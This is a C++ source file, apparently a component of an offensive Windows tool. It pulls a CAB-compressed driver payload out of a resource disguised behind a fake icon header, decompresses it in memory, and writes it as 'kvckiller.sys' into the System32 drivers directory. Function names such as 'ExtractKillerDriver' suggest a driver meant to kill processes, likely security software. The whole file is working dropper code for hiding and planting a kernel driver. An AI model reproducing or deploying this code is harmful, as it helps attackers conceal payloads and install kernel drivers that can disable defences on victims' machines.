#include "DriverExtract.h"
#include "GenIconSize.h"
#include "Resource.h"

#include <windows.h>
#include <fdi.h>
#include <iostream>

#pragma comment(lib, "Cabinet.lib")

// ============================================================================
// FDI IN-MEMORY STATE
// ============================================================================

static struct {
    const BYTE* cabPtr;
    SIZE_T      cabOff;
    SIZE_T      cabEnd;
    BYTE*       outPtr;
    SIZE_T      outUsed;
    SIZE_T      outCap;
} g_fdi;

static wchar_t g_driverPath[MAX_PATH];

// ============================================================================
// FDI CALLBACKS
// ============================================================================

static LPVOID DIAMONDAPI fdi_alloc(ULONG cb)
{
    return HeapAlloc(GetProcessHeap(), 0, cb);
}

static void DIAMONDAPI fdi_free(LPVOID pv)
{
    HeapFree(GetProcessHeap(), 0, pv);
}

static INT_PTR DIAMONDAPI fdi_open(char* /*pszFile*/, int /*oflag*/, int /*pmode*/)
{
    return 1;   // fake file handle — data comes from g_fdi.cabPtr
}

static UINT DIAMONDAPI fdi_read(INT_PTR /*hf*/, void* pv, UINT cb)
{
    SIZE_T avail = g_fdi.cabEnd - g_fdi.cabOff;
    if (cb > (UINT)avail) cb = (UINT)avail;
    if (cb > 0) {
        memcpy(pv, g_fdi.cabPtr + g_fdi.cabOff, cb);
        g_fdi.cabOff += cb;
    }
    return cb;
}

static UINT DIAMONDAPI fdi_write(INT_PTR /*hf*/, void* pv, UINT cb)
{
    if (g_fdi.outUsed + cb > g_fdi.outCap) return 0;
    memcpy(g_fdi.outPtr + g_fdi.outUsed, pv, cb);
    g_fdi.outUsed += cb;
    return cb;
}

static int DIAMONDAPI fdi_close(INT_PTR /*hf*/)
{
    return 0;
}

static long DIAMONDAPI fdi_seek(INT_PTR /*hf*/, long dist, int seektype)
{
    long newPos;
    if (seektype == SEEK_SET)
        newPos = dist;
    else if (seektype == SEEK_CUR)
        newPos = (long)g_fdi.cabOff + dist;
    else
        newPos = (long)g_fdi.cabEnd + dist;

    if (newPos < 0) newPos = 0;
    if ((SIZE_T)newPos > g_fdi.cabEnd) newPos = (long)g_fdi.cabEnd;
    g_fdi.cabOff = (SIZE_T)newPos;
    return newPos;
}

static INT_PTR DIAMONDAPI fdi_notify(FDINOTIFICATIONTYPE fdint, PFDINOTIFICATION /*pfdin*/)
{
    if (fdint == fdintCOPY_FILE)       return 1;
    if (fdint == fdintCLOSE_FILE_INFO) return TRUE;
    return 0;
}

// ============================================================================
// DECOMPRESS FROM RESOURCE
// ============================================================================

static bool DecompressFromResource() noexcept
{
    HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(IDR_DRIVER), RT_RCDATA);
    if (!hRes) {
        std::wcout << L"[!] IDR_DRIVER resource not found\n";
        return false;
    }

    DWORD totalSize = SizeofResource(nullptr, hRes);
    if (totalSize <= ICON_HEADER_SIZE + 4) {
        std::wcout << L"[!] Resource too small (no CAB payload)\n";
        return false;
    }

    HGLOBAL hGlob = LoadResource(nullptr, hRes);
    if (!hGlob) return false;

    const BYTE* raw = reinterpret_cast<const BYTE*>(LockResource(hGlob));
    if (!raw) return false;

    SIZE_T cabSize = totalSize - ICON_HEADER_SIZE;

    static const SIZE_T kOutCap = 1024 * 1024;   // 1 MB — enough for any driver
    BYTE* outBuf = reinterpret_cast<BYTE*>(HeapAlloc(GetProcessHeap(), 0, kOutCap));
    if (!outBuf) return false;

    g_fdi.cabPtr  = raw + ICON_HEADER_SIZE;
    g_fdi.cabOff  = 0;
    g_fdi.cabEnd  = cabSize;
    g_fdi.outPtr  = outBuf;
    g_fdi.outUsed = 0;
    g_fdi.outCap  = kOutCap;

    ERF erf{};
    HFDI hfdi = FDICreate(fdi_alloc, fdi_free, fdi_open, fdi_read,
                          fdi_write, fdi_close, fdi_seek, cpuUNKNOWN, &erf);
    if (!hfdi) {
        HeapFree(GetProcessHeap(), 0, outBuf);
        return false;
    }

    // Cabinet name / path strings are irrelevant — we read from memory
    BOOL ok = FDICopy(hfdi,
                      const_cast<char*>("memory.cab"),
                      const_cast<char*>(""),
                      0, fdi_notify, nullptr, nullptr);

    FDIDestroy(hfdi);

    if (!ok || g_fdi.outUsed == 0) {
        HeapFree(GetProcessHeap(), 0, outBuf);
        std::wcout << L"[!] FDI decompression failed (erf=" << erf.erfOper << L")\n";
        return false;
    }

    return true;
}

// ============================================================================
// PUBLIC API
// ============================================================================

bool ExtractKillerDriver() noexcept
{
    if (!DecompressFromResource()) return false;

    // Build destination path: %SystemRoot%\System32\drivers\kvckiller.sys
    wchar_t winDir[MAX_PATH] = {};
    GetSystemWindowsDirectoryW(winDir, MAX_PATH);
    _snwprintf_s(g_driverPath, MAX_PATH, _TRUNCATE,
                 L"%s\\System32\\drivers\\kvckiller.sys", winDir);

    HANDLE hFile = CreateFileW(g_driverPath, GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcout << L"[!] Cannot write " << g_driverPath
                   << L" (err=" << GetLastError() << L")\n";
        HeapFree(GetProcessHeap(), 0, g_fdi.outPtr);
        g_fdi.outPtr  = nullptr;
        g_fdi.outUsed = 0;
        return false;
    }

    DWORD written    = 0;
    DWORD toWrite    = static_cast<DWORD>(g_fdi.outUsed);
    BOOL  writeOk    = WriteFile(hFile, g_fdi.outPtr, toWrite, &written, nullptr);
    DWORD writeErr   = GetLastError();
    CloseHandle(hFile);

    HeapFree(GetProcessHeap(), 0, g_fdi.outPtr);
    g_fdi.outPtr  = nullptr;
    g_fdi.outUsed = 0;

    if (!writeOk || written != toWrite) {
        std::wcout << L"[!] WriteFile failed (err=" << writeErr << L")\n";
        return false;
    }

    std::wcout << L"[+] kvckiller.sys extracted (" << written << L" B)\n";
    return true;
}

const wchar_t* GetKillerDriverPath() noexcept
{
    if (g_driverPath[0]) return g_driverPath;

    wchar_t winDir[MAX_PATH] = {};
    GetSystemWindowsDirectoryW(winDir, MAX_PATH);
    _snwprintf_s(g_driverPath, MAX_PATH, _TRUNCATE,
                 L"%s\\System32\\drivers\\kvckiller.sys", winDir);
    return g_driverPath;
}
